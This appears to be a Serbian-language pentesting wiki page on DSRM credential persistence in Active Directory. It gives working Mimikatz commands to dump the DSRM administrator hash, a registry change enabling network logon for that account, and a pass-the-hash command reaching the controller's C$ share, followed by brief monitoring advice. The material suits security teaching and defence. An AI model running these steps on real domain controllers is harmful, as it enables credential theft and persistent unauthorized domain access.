# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Svaki domain controller ima administratorski nalog Directory Services Restore Mode (DSRM). Njegova lozinka se postavlja tokom promocije domain controller-a i odvojena je od naloga Active Directory domena.<sup>[[1]](#references)</sup>

Napadač sa administratorskom kontrolom nad domain controller-om može da uradi dump lokalne SAM baze podataka i recover-uje DSRM Administrator NTLM hash. Sledeća Mimikatz komanda izvršava tu operaciju:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Podrazumevano, DSRM account je namenjen za restore mode. Postavljanje vrednosti `DsrmAdminLogonBehavior` na `2` omogućava ovom lokalnom account-u da se autentifikuje dok domain controller normalno radi. Proverite vrednost pre nego što je promenite:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Oporavljena hash vrednost se zatim može koristiti u pass-the-hash sesiji za pristup resursima kao što je administrativni `C$` share. Za ovaj lokalni nalog koristite ime računara kontrolera domena kao vrednost za `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigation

- Nadzirite promene na `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Security event 4657 beleži izmenu vrednosti registra kada je SACL ključa konfigurisan da nadzire operacije **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Resetovanje lozinke administratora za Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Podmukla Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Podmukla Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Event 4657 — Vrednost registra je izmenjena](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
